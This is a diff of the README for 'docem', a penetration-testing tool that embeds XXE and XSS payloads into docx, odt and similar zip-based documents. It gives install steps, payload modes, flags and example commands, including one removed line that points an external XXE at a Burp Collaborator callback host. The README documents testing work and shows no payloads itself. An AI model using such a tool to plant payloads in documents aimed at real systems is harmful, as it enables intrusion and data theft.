@@ -8,21 +8,7 @@ _|_|_|      _|_|      _|_|_|    _|_|_|  _|    _|    _|
 ```
 
 
-**Disclaimer. Currently there are two tools: one for xss and one for xxe embedding - but that's only temporarily**
-
-
-# ToDo
-
-- Rewrite document_xss, cause it's terrible
-	- [x] Stage 0. Working with template
-		- [x] Prepare paths to all files in unpacked doc 
-		- [x] First we find all files inside unpacked folder 
-		- [x] Then we find all magic symbols 
-	- [ ] Stage 1. Combie two tools in one
-- [x] Read file with payloads
-- [ ] Add flag to specify custom url to use in XXE
-- [ ] Add flag to specify custom url to use in XSS
-- [ ] Add ability to embed not only in xml but in unzip file also
+Uility to embed XXE and XSS payloads in docx,odt,pptx,etc - any documents that is a zip archive with bunch of xml files inside
 
 # Tool
 
@@ -32,44 +18,45 @@ _|_|_|      _|_|      _|_|_|    _|_|_|  _|    _|    _|
 pip3 install -r requirements.txt
 ```
 
-## Usage docem
+## Usage Docem
 
 General 
 
 ```
-python3 docem.py
+python3 docem.py --help
 ```
 
-- `-s` - path to a sample file
-- `-pm` - payload mode
+- required args
+	- `-s` - path to a sample file
+	- `-pm` - payload mode
+		- `xss` - XSS - Cross Site Scripting 
+		- `xxe` - XXE - External XML Entity 
+- `-pm` - payload type
 	- `per_document` - for every payload, embed payload in all places in all files and create new doc
 	- `per_file` - for every payload, for every file inside a docuement, for all places inside file embed payload and create new doc
 	- `per_place` - for every payload, for every place in every file, embed payload and create new doc
 - `-pf` - payload file. Path to a file with payloads
-- `-kt` - do not delete temp unpacked and modified folders
+- `-kt` - do not delete temp folders in tmp 
 - `-h` - print help
 
 Example 
 ```bash
-./docem.py -s samples/xss_sample_0.odt -pf payloads/xss_tiny.txt -pm per_place
+./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place
+./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place
 ```
 
+# ToDo
 
-## Usage document.py
-
-- `-s` - path to a sample file
-- `-xu` - url to use in an external XXE
-- `-xf` - file to use in an internal XXE
-- `-kt` - do not delete temp unpacked and modified folders
-- `-h` - print help
-
-
-Example 
-
-```bash
-python3 document.py -s ../ODT/doc0.odt -xu http://123455.burpcollaborator.net
-```
-
+- Rewrite document_xss, cause it's terrible
+	- [x] Stage 0. Working with template
+		- [x] Prepare paths to all files in unpacked doc 
+		- [x] First we find all files inside unpacked folder 
+		- [x] Then we find all magic symbols 
+	- [x] Stage 1. Combie two tools in one
+- [x] Read file with payloads
+- [ ] Add flag to specify custom url to use in XXE
+- [ ] Add flag to specify custom url to use in XSS
+- [ ] Add ab
 
 ## Payloads
 
